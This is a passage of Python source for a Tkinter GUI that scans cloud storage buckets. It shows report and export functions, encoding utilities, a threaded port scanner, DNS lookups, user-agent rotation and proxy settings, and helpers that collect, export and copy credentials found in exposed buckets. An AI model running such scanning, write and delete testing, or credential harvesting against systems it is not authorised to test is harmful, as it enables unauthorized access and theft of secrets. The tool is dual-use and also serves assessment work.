║  ┌─────────────────────────────────────────────────────────────────────────┐ ║
║  │                           KEY FINDINGS                                   │ ║
║  ├─────────────────────────────────────────────────────────────────────────┤ ║
║  │                                                                         │ ║
║  │  • Total Buckets Discovered: {total_buckets:<45} │ ║
║  │  • Total Files Analyzed: {total_files:<48} │ ║
║  │  • Publicly Accessible Buckets: {public_buckets:<40} │ ║
║  │  • Writable Buckets: {writable_buckets:<46} │ ║
║  │  • Critical Vulnerabilities: {critical_vulns:<41} │ ║
║  │                                                                         │ ║
║  └─────────────────────────────────────────────────────────────────────────┘ ║
║                                                                               ║
║  ┌─────────────────────────────────────────────────────────────────────────┐ ║
║  │                        RISK ASSESSMENT                                   │ ║
║  ├─────────────────────────────────────────────────────────────────────────┤ ║
║  │                                                                         │ ║
║  │  OVERALL RISK LEVEL: {self.calculate_overall_risk():<48} │ ║
║  │                                                                         │ ║
║  │  Top Risks:                                                             │ ║
"""
        
        if writable_buckets > 0:
            summary += """
║  │    🔴 CRITICAL: Public write access detected                              │ ║
"""
        if public_buckets > 0:
            summary += """
║  │    🟠 HIGH: Public read access detected                                   │ ║
"""
        
        summary += f"""
║  │                                                                         │ ║
║  └─────────────────────────────────────────────────────────────────────────┘ ║
║                                                                               ║
║  ┌─────────────────────────────────────────────────────────────────────────┐ ║
║  │                    RECOMMENDATIONS                                       │ ║
║  ├─────────────────────────────────────────────────────────────────────────┤ ║
║  │                                                                         │ ║
║  │  1. Remove public write permissions from all buckets                     │ ║
║  │  2. Restrict public read access to necessary buckets only                │ ║
║  │  3. Enable bucket logging and monitoring                                 │ ║
║  │  4. Implement encryption for sensitive data                              │ ║
║  │  5. Review and remove exposed credentials                                │ ║
║  │  6. Enable versioning to protect against data loss                       │ ║
║  │                                                                         │ ║
║  └─────────────────────────────────────────────────────────────────────────┘ ║
║                                                                               ║
║  This report was generated by an automated security assessment tool.         ║
║  Please review all findings and implement recommendations as appropriate.    ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""
        
        messagebox.showinfo("Executive Summary", summary)
        self.log("Executive summary generated")
    
    def generate_vulnerability_report(self):
        """Generate detailed vulnerability report"""
        filename = filedialog.asksaveasfilename(defaultextension=".html", filetypes=[("HTML", "*.html")])
        if not filename:
            return
        
        vulnerabilities = []
        if hasattr(self, 'vuln_tree'):
            for item in self.vuln_tree.get_children():
                values = self.vuln_tree.item(item)['values']
                vulnerabilities.append({
                    'bucket': values[0],
                    'type': values[1],
                    'severity': values[2],
                    'details': values[3],
                    'discovered': values[4]
                })
        
        html = f'''<!DOCTYPE html>
<html>
<head>
    <title>Vulnerability Report - {self.APP_NAME}</title>
    <meta charset="UTF-8">
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        h1 {{ color: #ff4444; }}
        table {{ border-collapse: collapse; width: 100%; }}
        th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
        th {{ background-color: #4CAF50; color: white; }}
        .critical {{ background-color: #ff4444; color: white; }}
        .high {{ background-color: #ff8800; }}
        .medium {{ background-color: #ffaa00; }}
        .low {{ background-color: #44ff44; }}
    </style>
</head>
<body>
    <h1>🔐 Vulnerability Assessment Report</h1>
    <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    <p>Total Vulnerabilities Found: {len(vulnerabilities)}</p>
    
    <table>
        <thead>
            <tr>
                <th>Bucket</th>
                <th>Vulnerability Type</th>
                <th>Severity</th>
                <th>Details</th>
                <th>Discovered</th>
            </tr>
        </thead>
        <tbody>
'''
        
        for vuln in vulnerabilities:
            severity_class = vuln['severity'].lower()
            html += f'''
            <tr>
                <td>{vuln['bucket']}</td>
                <td>{vuln['type']}</td>
                <td class="{severity_class}">{vuln['severity']}</td>
                <td>{vuln['details']}</td>
                <td>{vuln['discovered']}</td>
            </tr>
'''
        
        html += '''
        </tbody>
    </table>
</body>
</html>
'''
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html)
        
        webbrowser.open(f'file://{os.path.abspath(filename)}')
        messagebox.showinfo("Report Generated", f"Vulnerability report saved to:\n{filename}")
    
    def generate_credentials_report(self):
        """Generate credentials report"""
        filename = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV", "*.csv")])
        if not filename:
            return
        
        with open(filename, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(['Bucket', 'File', 'Credential Type', 'Credential Value', 'Severity', 'Found Date'])
            
            if hasattr(self, 'cred_tree'):
                for item in self.cred_tree.get_children():
                    values = self.cred_tree.item(item)['values']
                    writer.writerow(values)
        
        messagebox.showinfo("Report Generated", f"Credentials report saved to:\n{filename}")
    
    def generate_inventory_report(self):
        """Generate inventory report of all buckets and files"""
        filename = filedialog.asksaveasfilename(defaultextension=".html", filetypes=[("HTML", "*.html")])
        if not filename:
            return
        
        html = f'''<!DOCTYPE html>
<html>
<head>
    <title>Inventory Report - {self.APP_NAME}</title>
    <meta charset="UTF-8">
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        h1 {{ color: #00ccff; }}
        .bucket {{ margin-bottom: 30px; border: 1px solid #ddd; padding: 10px; }}
        .bucket h2 {{ background: #333; color: white; padding: 5px; }}
        table {{ width: 100%; border-collapse: collapse; margin-top: 10px; }}
        th, td {{ border: 1px solid #ddd; padding: 5px; text-align: left; }}
        th {{ background: #555; color: white; }}
    </style>
</head>
<body>
    <h1>📦 Cloud Storage Inventory Report</h1>
    <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    <p>Total Buckets: {len(self.buckets)}</p>
'''
        
        for bucket in self.buckets:
            html += f'''
    <div class="bucket">
        <h2>📁 {bucket.name}</h2>
        <p>Provider: {bucket.provider.value}</p>
        <p>URL: <a href="{bucket.url}" target="_blank">{bucket.url}</a></p>
        <p>Total Files: {bucket.total_files}</p>
        <p>Total Size: {self.format_size(bucket.total_size)}</p>
        
        <h3>Files:</h3>
        <table>
            <thead>
                <tr><th>File Name</th><th>Size</th><th>Type</th><th>Modified</th></tr>
            </thead>
            <tbody>
'''
            for file_info in bucket.files[:50]:  # Show first 50 files
                html += f'''
                <tr>
                    <td>{file_info.path}</td>
                    <td>{self.format_size(file_info.size)}</td>
                    <td>{file_info.file_type.value}</td>
                    <td>{file_info.last_modified[:16] if file_info.last_modified else 'Unknown'}</td>
                </tr>
'''
            if len(bucket.files) > 50:
                html += f'''
                <tr>
                    <td colspan="4">... and {len(bucket.files) - 50} more files</td>
                </tr>
'''
            html += '''
            </tbody>
        </table>
    </div>
'''
        
        html += '''
</body>
</html>
'''
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html)
        
        webbrowser.open(f'file://{os.path.abspath(filename)}')
        messagebox.showinfo("Report Generated", f"Inventory report saved to:\n{filename}")
    
    def generate_risk_assessment(self):
        """Generate risk assessment report"""
        risk_scores = [b.risk_score for b in self.buckets]
        avg_risk = sum(risk_scores) / len(risk_scores) if risk_scores else 0
        
        critical = len([b for b in self.buckets if b.risk_level == "Critical"])
        high = len([b for b in self.buckets if b.risk_level == "High"])
        medium = len([b for b in self.buckets if b.risk_level == "Medium"])
        low = len([b for b in self.buckets if b.risk_level == "Low"])
        
        assessment = f"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                           RISK ASSESSMENT REPORT                              ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║                                                                               ║
║  Overall Risk Score: {avg_risk:.1f}/100                                        ║
║                                                                               ║
║  Risk Distribution:                                                           ║
║    🔴 Critical: {critical:<48} ║
║    🟠 High:     {high:<48} ║
║    🟡 Medium:   {medium:<48} ║
║    🟢 Low:      {low:<48} ║
║                                                                               ║
║  ┌─────────────────────────────────────────────────────────────────────────┐ ║
║  │                      HIGHEST RISK BUCKETS                                │ ║
║  ├─────────────────────────────────────────────────────────────────────────┤ ║
"""
        
        high_risk_buckets = sorted(self.buckets, key=lambda x: x.risk_score, reverse=True)[:5]
        for bucket in high_risk_buckets:
            assessment += f"""
║  │  • {bucket.name[:50]:<50} Score: {bucket.risk_score} ({bucket.risk_level}) │ ║
"""
        
        assessment += f"""
║  └─────────────────────────────────────────────────────────────────────────┘ ║
║                                                                               ║
║  RECOMMENDED ACTIONS:                                                         ║
║    1. IMMEDIATELY address all Critical and High risk buckets                  ║
║    2. Remove public write permissions                                         ║
║    3. Restrict public read access                                             ║
║    4. Enable encryption and logging                                           ║
║    5. Rotate any exposed credentials                                          ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""
        
        messagebox.showinfo("Risk Assessment", assessment)
        self.log("Risk assessment generated")
    
    def export_custom_report(self):
        """Export report in selected format"""
        format_type = self.export_format_var.get()
        
        if format_type == "HTML":
            self.generate_full_report()
        elif format_type == "PDF":
            self.generate_pdf_report()
        elif format_type == "JSON":
            self.export_json()
        elif format_type == "CSV":
            self.export_csv()
        elif format_type == "XML":
            self.export_xml()
        elif format_type == "Markdown":
            self.export_markdown()
    
    def export_json(self):
        """Export data to JSON format"""
        filename = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("JSON", "*.json")])
        if not filename:
            return
        
        export_data = {
            'tool': self.APP_NAME,
            'version': self.VERSION,
            'timestamp': datetime.now().isoformat(),
            'buckets': [asdict(b) for b in self.buckets],
            'statistics': {
                'total_buckets': len(self.buckets),
                'total_files': sum(b.total_files for b in self.buckets),
                'total_size': sum(b.total_size for b in self.buckets),
                'public_buckets': sum(1 for b in self.buckets if b.is_public_read),
                'writable_buckets': sum(1 for b in self.buckets if b.is_public_write)
            }
        }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(export_data, f, indent=2, ensure_ascii=False)
        
        messagebox.showinfo("Export Complete", f"JSON exported to:\n{filename}")
    
    def export_csv(self):
        """Export data to CSV format"""
        filename = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV", "*.csv")])
        if not filename:
            return
        
        with open(filename, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(['Bucket', 'Provider', 'Region', 'Files', 'Size', 'Public Read', 'Public Write', 'Risk Score', 'Risk Level', 'URL'])
            
            for bucket in self.buckets:
                writer.writerow([
                    bucket.name,
                    bucket.provider.value,
                    bucket.region,
                    bucket.total_files,
                    self.format_size(bucket.total_size),
                    'Yes' if bucket.is_public_read else 'No',
                    'Yes' if bucket.is_public_write else 'No',
                    bucket.risk_score,
                    bucket.risk_level,
                    bucket.url
                ])
        
        messagebox.showinfo("Export Complete", f"CSV exported to:\n{filename}")
    
    def export_xml(self):
        """Export data to XML format"""
        filename = filedialog.asksaveasfilename(defaultextension=".xml", filetypes=[("XML", "*.xml")])
        if not filename:
            return
        
        root = ET.Element("CloudStorageReport")
        root.set("version", self.VERSION)
        root.set("timestamp", datetime.now().isoformat())
        
        buckets_elem = ET.SubElement(root, "Buckets")
        for bucket in self.buckets:
            bucket_elem = ET.SubElement(buckets_elem, "Bucket")
            ET.SubElement(bucket_elem, "Name").text = bucket.name
            ET.SubElement(bucket_elem, "Provider").text = bucket.provider.value
            ET.SubElement(bucket_elem, "Region").text = bucket.region
            ET.SubElement(bucket_elem, "TotalFiles").text = str(bucket.total_files)
            ET.SubElement(bucket_elem, "TotalSize").text = str(bucket.total_size)
            ET.SubElement(bucket_elem, "PublicRead").text = str(bucket.is_public_read)
            ET.SubElement(bucket_elem, "PublicWrite").text = str(bucket.is_public_write)
            ET.SubElement(bucket_elem, "RiskScore").text = str(bucket.risk_score)
            ET.SubElement(bucket_elem, "RiskLevel").text = bucket.risk_level
            ET.SubElement(bucket_elem, "URL").text = bucket.url
        
        tree = ET.ElementTree(root)
        tree.write(filename, encoding='utf-8', xml_declaration=True)
        
        messagebox.showinfo("Export Complete", f"XML exported to:\n{filename}")
    
    def export_markdown(self):
        """Export data to Markdown format"""
        filename = filedialog.asksaveasfilename(defaultextension=".md", filetypes=[("Markdown", "*.md")])
        if not filename:
            return
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"# {self.APP_NAME} v{self.VERSION} - Security Assessment Report\n\n")
            f.write(f"**Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            
            f.write("## Summary\n\n")
            f.write(f"- **Total Buckets:** {len(self.buckets)}\n")
            f.write(f"- **Total Files:** {sum(b.total_files for b in self.buckets)}\n")
            f.write(f"- **Total Size:** {self.format_size(sum(b.total_size for b in self.buckets))}\n")
            f.write(f"- **Public Buckets:** {sum(1 for b in self.buckets if b.is_public_read)}\n")
            f.write(f"- **Writable Buckets:** {sum(1 for b in self.buckets if b.is_public_write)}\n\n")
            
            f.write("## Buckets\n\n")
            f.write("| Bucket | Provider | Files | Size | Public Read | Public Write | Risk |\n")
            f.write("|--------|----------|-------|------|-------------|--------------|------|\n")
            
            for bucket in self.buckets:
                f.write(f"| {bucket.name} | {bucket.provider.value} | {bucket.total_files} | {self.format_size(bucket.total_size)} | {'Yes' if bucket.is_public_read else 'No'} | {'Yes' if bucket.is_public_write else 'No'} | {bucket.risk_level} |\n")
        
        messagebox.showinfo("Export Complete", f"Markdown exported to:\n{filename}")
    
    # ========================================================================
    # TOOL METHODS
    # ========================================================================
    
    def generate_hashes(self):
        """Generate hashes from input text"""
        text = self.hash_input.get(1.0, tk.END).strip()
        if not text:
            return
        
        self.hash_output.delete(1.0, tk.END)
        self.hash_output.insert(tk.END, f"MD5:     {hashlib.md5(text.encode()).hexdigest()}\n")
        self.hash_output.insert(tk.END, f"SHA1:    {hashlib.sha1(text.encode()).hexdigest()}\n")
        self.hash_output.insert(tk.END, f"SHA256:  {hashlib.sha256(text.encode()).hexdigest()}\n")
        self.hash_output.insert(tk.END, f"SHA512:  {hashlib.sha512(text.encode()).hexdigest()}\n")
    
    def generate_crypto_key(self):
        """Generate encryption key"""
        key = Fernet.generate_key()
        self.crypto_key_var.set(key.decode())
        self.log("Generated new encryption key")
    
    def encrypt_data(self):
        """Encrypt data with Fernet"""
        key = self.crypto_key_var.get()
        if not key:
            messagebox.showwarning("Warning", "Please generate or enter a key!")
            return
        
        data = self.crypto_input.get(1.0, tk.END).strip()
        if not data:
            return
        
        try:
            fernet = Fernet(key.encode())
            encrypted = fernet.encrypt(data.encode())
            self.crypto_output.delete(1.0, tk.END)
            self.crypto_output.insert(1.0, encrypted.decode())
            self.log("Data encrypted successfully")
        except Exception as e:
            messagebox.showerror("Error", f"Encryption failed: {str(e)}")
    
    def decrypt_data(self):
        """Decrypt data with Fernet"""
        key = self.crypto_key_var.get()
        if not key:
            messagebox.showwarning("Warning", "Please enter the key!")
            return
        
        data = self.crypto_input.get(1.0, tk.END).strip()
        if not data:
            return
        
        try:
            fernet = Fernet(key.encode())
            decrypted = fernet.decrypt(data.encode())
            self.crypto_output.delete(1.0, tk.END)
            self.crypto_output.insert(1.0, decrypted.decode())
            self.log("Data decrypted successfully")
        except Exception as e:
            messagebox.showerror("Error", f"Decryption failed: {str(e)}")
    
    def base64_encode(self):
        """Encode text to Base64"""
        text = self.base64_input.get(1.0, tk.END).strip()
        if text:
            encoded = base64.b64encode(text.encode()).decode()
            self.base64_output.delete(1.0, tk.END)
            self.base64_output.insert(1.0, encoded)
    
    def base64_decode(self):
        """Decode Base64 to text"""
        text = self.base64_input.get(1.0, tk.END).strip()
        if text:
            try:
                decoded = base64.b64decode(text).decode()
                self.base64_output.delete(1.0, tk.END)
                self.base64_output.insert(1.0, decoded)
            except:
                self.base64_output.delete(1.0, tk.END)
                self.base64_output.insert(1.0, "Error: Invalid Base64 string")
    
    def url_encode(self):
        """URL encode text"""
        text = self.url_input.get(1.0, tk.END).strip()
        if text:
            encoded = urllib.parse.quote(text)
            self.url_output.delete(1.0, tk.END)
            self.url_output.insert(1.0, encoded)
    
    def url_decode(self):
        """URL decode text"""
        text = self.url_input.get(1.0, tk.END).strip()
        if text:
            decoded = urllib.parse.unquote(text)
            self.url_output.delete(1.0, tk.END)
            self.url_output.insert(1.0, decoded)
    
    def hex_encode(self):
        """Encode text to hex"""
        text = self.hex_input.get(1.0, tk.END).strip()
        if text:
            encoded = text.encode().hex()
            self.hex_output.delete(1.0, tk.END)
            self.hex_output.insert(1.0, encoded)
    
    def hex_decode(self):
        """Decode hex to text"""
        text = self.hex_input.get(1.0, tk.END).strip()
        if text:
            try:
                decoded = bytes.fromhex(text).decode()
                self.hex_output.delete(1.0, tk.END)
                self.hex_output.insert(1.0, decoded)
            except:
                self.hex_output.delete(1.0, tk.END)
                self.hex_output.insert(1.0, "Error: Invalid hex string")
    
    def format_json(self):
        """Format and validate JSON"""
        text = self.json_input.get(1.0, tk.END).strip()
        if text:
            try:
                data = json.loads(text)
                formatted = json.dumps(data, indent=2, ensure_ascii=False)
                self.json_output.delete(1.0, tk.END)
                self.json_output.insert(1.0, formatted)
            except json.JSONDecodeError as e:
                self.json_output.delete(1.0, tk.END)
                self.json_output.insert(1.0, f"Error: Invalid JSON\n{e}")
    
    def test_regex(self):
        """Test regex pattern against text"""
        pattern = self.regex_pattern_var.get()
        if not pattern:
            return
        
        text = self.regex_input.get(1.0, tk.END)
        try:
            matches = re.findall(pattern, text, re.MULTILINE | re.IGNORECASE)
            self.regex_output.delete(1.0, tk.END)
            if matches:
                self.regex_output.insert(tk.END, f"Found {len(matches)} match(es):\n\n")
                for i, match in enumerate(matches, 1):
                    self.regex_output.insert(tk.END, f"{i}. {match}\n")
            else:
                self.regex_output.insert(tk.END, "No matches found.")
        except re.error as e:
            self.regex_output.delete(1.0, tk.END)
            self.regex_output.insert(1.0, f"Regex Error: {e}")
    
    def generate_password(self):
        """Generate random password"""
        length = self.pass_length_var.get()
        characters = ""
        
        if self.pass_upper_var.get():
            characters += string.ascii_uppercase
        if self.pass_lower_var.get():
            characters += string.ascii_lowercase
        if self.pass_digits_var.get():
            characters += string.digits
        if self.pass_symbols_var.get():
            characters += "!@#$%^&*()_+-=[]{}|;:,.<>?"
        
        if not characters:
            characters = string.ascii_letters + string.digits
        
        password = ''.join(secrets.choice(characters) for _ in range(length))
        self.pass_output.delete(1.0, tk.END)
        self.pass_output.insert(1.0, password)
        self.copy_to_clipboard(password)
    
    def generate_uuids(self):
        """Generate UUIDs"""
        count = self.uuid_count_var.get()
        self.uuid_output.delete(1.0, tk.END)
        for i in range(count):
            self.uuid_output.insert(tk.END, f"{uuid.uuid4()}\n")
    
    def scan_ports(self):
        """Scan ports on target"""
        target = self.port_target_var.get()
        if not target:
            messagebox.showwarning("Warning", "Enter a target!")
            return
        
        port_range = self.port_range_var.get()
        ports = []
        
        if '-' in port_range:
            start, end = map(int, port_range.split('-'))
            ports = range(start, end + 1)
        else:
            ports = [int(p.strip()) for p in port_range.split(',')]
        
        self.port_output.delete(1.0, tk.END)
        self.port_output.insert(tk.END, f"Scanning {target}...\n\n")
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                sock.close()
                if result == 0:
                    self.root.after(0, lambda: self.port_output.insert(tk.END, f"Port {port}: OPEN\n"))
            except:
                pass
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(scan_port, ports)
        
        self.port_output.insert(tk.END, "\nScan complete!")
    
    def dns_lookup(self):
        """Perform DNS lookup"""
        domain = self.dns_target_var.get()
        if not domain:
            messagebox.showwarning("Warning", "Enter a domain!")
            return
        
        self.dns_output.delete(1.0, tk.END)
        self.dns_output.insert(tk.END, f"DNS lookup for {domain}:\n\n")
        
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']
        
        for record_type in record_types:
            try:
                answers = dns.resolver.resolve(domain, record_type)
                self.dns_output.insert(tk.END, f"{record_type} records:\n")
                for rdata in answers:
                    self.dns_output.insert(tk.END, f"  {rdata}\n")
                self.dns_output.insert(tk.END, "\n")
            except:
                pass
    
    # ========================================================================
    # ADDITIONAL METHODS
    # ========================================================================
    
    def configure_http_session_pool(self):
        """Configure requests session connection pool based on concurrency settings"""
        try:
            max_threads = int(self.settings.get('max_threads', 50))
        except Exception:
            max_threads = 50

        # Keep sensible bounds to avoid excessive resource use
        pool_size = max(50, min(400, max_threads * 2))
        adapter = HTTPAdapter(pool_connections=pool_size, pool_maxsize=pool_size)
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)

    def save_all_settings(self):
        """Save all settings"""
        self.settings['timeout'] = self.timeout_var.get()
        self.settings['max_threads'] = self.threads_var.get()
        self.settings['deep_scan'] = self.deep_scan_var.get()
        self.settings['test_write'] = self.test_write_var.get()
        self.settings['test_delete'] = self.test_delete_var.get()
        self.settings['max_retries'] = self.retries_var.get()
        self.settings['rate_limit_delay'] = self.delay_var.get()
        self.settings['max_depth'] = self.max_depth_var.get()
        self.settings['results_dir'] = self.results_dir_var.get()
        self.settings['auto_save'] = self.auto_save_var.get()
        self.settings['notify_on_complete'] = self.notify_var.get()
        self.settings['proxy_enabled'] = self.proxy_enabled_var.get()
        self.settings['proxy_url'] = self.proxy_url_var.get()
        self.settings['verify_ssl'] = self.verify_ssl_var.get()
        self.settings['user_agent_rotation'] = self.ua_rotation_var.get()
        self.settings['detect_ssrf'] = self.detect_ssrf_var.get()
        self.settings['detect_sqli'] = self.detect_sqli_var.get()
        self.settings['detect_xss'] = self.detect_xss_var.get()
        self.settings['detect_lfi'] = self.detect_lfi_var.get()
        self.settings['detect_rce'] = self.detect_rce_var.get()
        self.settings['check_virustotal'] = self.vt_enabled_var.get()
        self.settings['virus_total_api_key'] = self.vt_key_var.get()
        
        # Save to file
        with open(os.path.join(self.settings['results_dir'], 'settings.json'), 'w') as f:
            json.dump(self.settings, f, indent=2)
        
        # Update session
        self.configure_http_session_pool()
        self.session.headers.update({'User-Agent': self.get_random_user_agent() if self.settings['user_agent_rotation'] else self.session.headers['User-Agent']})
        
        # Update proxy
        if self.settings['proxy_enabled'] and self.settings['proxy_url']:
            self.session.proxies = {'http': self.settings['proxy_url'], 'https': self.settings['proxy_url']}
        
        messagebox.showinfo("Settings", "Settings saved successfully!")
        self.log("Settings saved")
    
    def get_random_user_agent(self) -> str:
        """Get random user agent"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
        ]
        return random.choice(user_agents)
    
    def calculate_overall_risk(self) -> str:
        """Calculate overall risk level"""
        if not self.buckets:
            return "Unknown"
        
        avg_risk = sum(b.risk_score for b in self.buckets) / len(self.buckets)
        
        if avg_risk >= 70:
            return "CRITICAL"
        elif avg_risk >= 50:
            return "HIGH"
        elif avg_risk >= 25:
            return "MEDIUM"
        else:
            return "LOW"
    
    def browse_results_dir(self):
        """Browse for results directory"""
        directory = filedialog.askdirectory()
        if directory:
            self.results_dir_var.set(directory)
            self.settings['results_dir'] = directory
            os.makedirs(directory, exist_ok=True)
    
    def browse_wordlist(self):
        """Browse for wordlist file"""
        filename = filedialog.askopenfilename(filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if filename:
            self.wordlist_var.set(filename)
    
    def get_selected_bucket_from_tree(self) -> Optional[BucketInfo]:
        """Get selected bucket from results tree"""
        selection = self.results_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Select a bucket from the Results tab!")
            return None
        
        bucket_name = self.results_tree.item(selection[0])['values'][0]
        bucket = next((b for b in self.buckets if b.name == bucket_name), None)
        
        if not bucket:
            messagebox.showwarning("Warning", "Bucket not found!")
            return None
        
        return bucket
    
    def open_bucket_from_results(self, event):
        """Open bucket URL from results"""
        selection = self.results_tree.selection()
        if selection:
            values = self.results_tree.item(selection[0])['values']
            if len(values) >= 9:
                url = values[8]
                if url:
                    webbrowser.open(str(url))
    
    def results_context_menu(self, event):
        """Show context menu for results"""
        selection = self.results_tree.selection()
        if not selection:
            return

        menu = tk.Menu(self.root, tearoff=0)
        menu.add_command(label="Open in Browser", command=lambda: self.open_bucket_from_results(None))
        menu.add_command(label="Copy URL", command=lambda: self.copy_to_clipboard(str(self.results_tree.item(selection[0])['values'][8]) if len(self.results_tree.item(selection[0])['values']) >= 9 else ""))
        menu.add_command(label="Load in File Manager", command=lambda: self.load_bucket_in_file_manager())
        menu.add_command(label="Check Permissions (R/W/M)", command=self.show_selected_bucket_permissions)
        menu.add_command(label="Scan Vulnerabilities", command=lambda: self.scan_bucket_vulnerabilities(self.get_selected_bucket_from_tree()))
        menu.post(event.x_root, event.y_root)

    def show_selected_bucket_permissions(self):
        """Display read/write/modify permissions for selected bucket."""
        bucket = self.get_selected_bucket_from_tree()
        if not bucket:
            return

        perms = self.check_bucket_permissions(bucket.name, bucket.provider)

        if not hasattr(self, '_bucket_perms_cache'):
            self._bucket_perms_cache = {}
        if not hasattr(self, '_auto_perm_scanned_keys'):
            self._auto_perm_scanned_keys = set()

        cache_key = (bucket.name, bucket.provider.value)
        self._bucket_perms_cache[cache_key] = perms
        self._auto_perm_scanned_keys.add(cache_key)

        self.filter_results()

        msg = (
            f"Bucket: {bucket.name}\n"
            f"Provider: {bucket.provider.value}\n\n"
            f"Read:   {'✅ Allowed' if perms['read'] else '❌ Denied'}\n"
            f"Write:  {'✅ Allowed' if perms['write'] else '❌ Denied'}\n"
            f"Modify: {'✅ Allowed' if perms['modify'] else '❌ Denied'}\n"
        )

        self.log(f"Permissions check for {bucket.name} -> R:{perms['read']} W:{perms['write']} M:{perms['modify']}")
        messagebox.showinfo("Bucket Permissions", msg)
    
    def load_bucket_in_file_manager(self):
        """Load selected bucket in file manager"""
        bucket = self.get_selected_bucket_from_tree()
        if bucket:
            self.fm_bucket_var.set(bucket.name)
            self.switch_to_tab(1)  # Switch to File Manager tab
            self.fm_load_bucket()
    
    def open_previous_report(self, event=None):
        """Open a previous report"""
        selection = self.reports_list.curselection()
        if selection:
            report_path = self.reports_list.get(selection[0])
            if os.path.exists(report_path):
                webbrowser.open(f'file://{os.path.abspath(report_path)}')
    
    def load_history_scan(self, event):
        """Load scan from history"""
        selection = self.history_tree.selection()
        if selection:
            scan_id = self.history_tree.item(selection[0])['values'][0]
            self.cursor.execute('SELECT * FROM scan_jobs WHERE id = ?', (scan_id,))
            scan = self.cursor.fetchone()
            if scan:
                self.scan_target_var.set(scan[1])
                self.log(f"Loaded scan from history: {scan[1]}")
    
    def clear_history(self):
        """Clear scan history"""
        if messagebox.askyesno("Confirm", "Clear all scan history?"):
            self.cursor.execute('DELETE FROM scan_jobs')
            self.conn.commit()
            for item in self.history_tree.get_children():
                self.history_tree.delete(item)
            self.log("Scan history cleared")
    
    def export_history(self):
        """Export scan history"""
        filename = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV", "*.csv")])
        if filename:
            self.cursor.execute('SELECT * FROM scan_jobs')
            rows = self.cursor.fetchall()
            
            with open(filename, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow(['ID', 'Target', 'Provider', 'Status', 'Start Time', 'End Time', 'Buckets Found', 'Files Found', 'Credentials Found'])
                writer.writerows(rows)
            
            messagebox.showinfo("Export Complete", f"History exported to:\n{filename}")
    
    def export_credentials_to_file(self):
        """Export credentials to file"""
        filename = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text", "*.txt"), ("CSV", "*.csv")])
        if filename:
            self.cursor.execute('SELECT * FROM credentials ORDER BY found_timestamp DESC')
            rows = self.cursor.fetchall()
            
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"Credentials Export - {self.APP_NAME} v{self.VERSION}\n")
                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 80 + "\n\n")
                
                for row in rows:
                    f.write(f"Bucket: {row[1]}\n")
                    f.write(f"File: {row[2]}\n")
                    f.write(f"Type: {row[3]}\n")
                    f.write(f"Value: {row[4]}\n")
                    f.write(f"Severity: {row[5]}\n")
                    f.write(f"Found: {row[6]}\n")
                    f.write("-" * 40 + "\n")
            
            messagebox.showinfo("Export Complete", f"Credentials exported to:\n{filename}")
    
    def export_vulnerability_report(self):
        """Export vulnerability report"""
        filename = filedialog.asksaveasfilename(defaultextension=".html", filetypes=[("HTML", "*.html")])
        if filename:
            self.generate_vulnerability_report(filename)
    
    def copy_selected_credential(self):
        """Copy selected credential to clipboard"""
        selection = self.cred_tree.selection()
        if selection:
            values = self.cred_tree.item(selection[0])['values']
            credential = f"{values[2]}: {values[3]}"
            self.copy_to_clipboard(credential)
            self.log(f"Copied credential: {values[2]}")
    
    def clear_credentials(self):
        """Clear credentials from display"""
        if messagebox.askyesno("Confirm", "Clear all credentials from display?"):
            for item in self.cred_tree.get_children():
                self.cred_tree.delete(item)
            self.log("Credentials cleared from display")
    
    def validate_selected_credential(self):
        """Validate selected credential (basic check)"""
        selection = self.cred_tree.selection()
        if not selection:
            return
        
        values = self.cred_tree.item(selection[0])['values']
        cred_type = values[2]
        cred_value = values[3]
        
        # Basic validation based on type
        if "AWS" in cred_type:
            if cred_value.startswith("AKIA"):
                messagebox.showinfo("Validation", "This appears to be a valid AWS Access Key format.")
            else:
                messagebox.showwarning("Validation", "This may not be a valid AWS credential.")
